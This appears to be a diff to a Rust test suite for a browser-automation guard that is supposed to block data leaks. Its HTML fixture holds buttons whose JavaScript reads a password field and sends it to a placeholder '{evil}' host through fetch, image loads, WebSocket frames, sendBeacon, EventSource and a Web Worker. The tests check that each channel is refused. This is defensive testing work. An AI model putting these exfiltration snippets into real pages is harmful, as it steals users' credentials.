@@ -29,7 +29,14 @@ fetch('{evil}/f?d='+encodeURIComponent(v));
 var im=document.createElement('img');im.src='{evil}/i?d='+encodeURIComponent(v);document.body.appendChild(im);
 var w=new WebSocket('{ws}/w');w.onopen=function(){{w.send(v)}};
 navigator.sendBeacon('{evil}/b',v);
-">Exfil</button></body></html>"#
+">Exfil</button>
+<button type="button" id="x2" onclick="
+var v=document.getElementById('pw').value;
+var b=new WebSocket('{ws}/wb');b.onopen=function(){{b.send(new Blob([v]))}};
+new EventSource('{evil}/es?d='+encodeURIComponent(v));
+var src='onmessage=function(e){{var v=e.data;fetch(\'{evil}/wf?d=\'+encodeURIComponent(v));var w=new WebSocket(\'{ws}/ww\');w.onopen=function(){{w.send(v)}};}}';
+var k=new Worker(window.URL.createObjectURL(new Blob([src])));k.postMessage(v);
+">Exfil2</button></body></html>"#
     )
 }
 
@@ -62,8 +69,15 @@ fn conn(mut s: TcpStream, lg: Log, html: Arc<Mutex<String>>) {
     {
         if let Ok(mut ws) = tungstenite::accept(s) {
             while let Ok(m) = ws.read() {
-                if let tungstenite::Message::Text(t) = m {
-                    lg.lock().unwrap().push(format!("WS frame {t}"));
+                match m {
+                    tungstenite::Message::Text(t) => {
+                        lg.lock().unwrap().push(format!("WS frame {t}"))
+                    }
+                    tungstenite::Message::Binary(b) => lg
+                        .lock()
+                        .unwrap()
+                        .push(format!("WS frame {}", String::from_utf8_lossy(&b))),
+                    _ => {}
                 }
             }
         }
@@ -286,6 +300,15 @@ fn run(chrome: bool, mutate: bool, keyring: bool) -> Outcome {
     std::thread::sleep(std::time::Duration::from_millis(2500));
     // The manuk engine fetches a dynamically inserted <img> only when visuals load (a screenshot).
     step(&mut c, "screenshot", json!({}));
+    if chrome {
+        // W3.16.b: Blob WS frame, EventSource, and a dedicated worker that fetches and opens a WebSocket.
+        step(
+            &mut c,
+            "act",
+            json!({"handle": handle_of(&nav, "\"Exfil2\""), "action": "click"}),
+        );
+        std::thread::sleep(std::time::Duration::from_millis(2500));
+    }
     step(&mut c, "observe", json!({}));
     step(
         &mut c,
@@ -344,6 +367,16 @@ fn assert_green(chrome: bool, keyring: bool) {
         "want {owed} page-request refusals, got {pr}: {:#?}",
         o.refusals
     );
+    if chrome {
+        // W3.16.b: each residual channel is refused and logged (Blob frame, worker frame, worker fetch, EventSource).
+        let wsf = o
+            .refusals
+            .iter()
+            .filter(|r| r.contains("WebSocket frame"))
+            .count();
+        assert!(wsf >= 3, "want >=3 WS-frame refusals (text, Blob, worker), got {wsf}: {:#?}", o.refusals);
+        assert!(pr >= 5, "want >=5 page-request refusals incl. worker fetch + EventSource, got {pr}: {:#?}", o.refusals);
+    }
     assert!(
         o.app
             .iter()
@@ -457,4 +490,16 @@ fn guard_off_chrome_run_leaks_so_the_gate_goes_red() {
         "mutant did not leak; the gate cannot go red: {:#?}",
         o.evil
     );
+}
+
+#[test]
+fn guard_off_chrome_run_leaks_the_w316b_channels() {
+    let o = run(true, true, false);
+    for ch in ["WS frame", "GET /wf?", "GET /es?"] {
+        assert!(
+            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
+            "chrome mutant lacks {ch}: {:#?}",
+            o.evil
+        );
+    }
 }
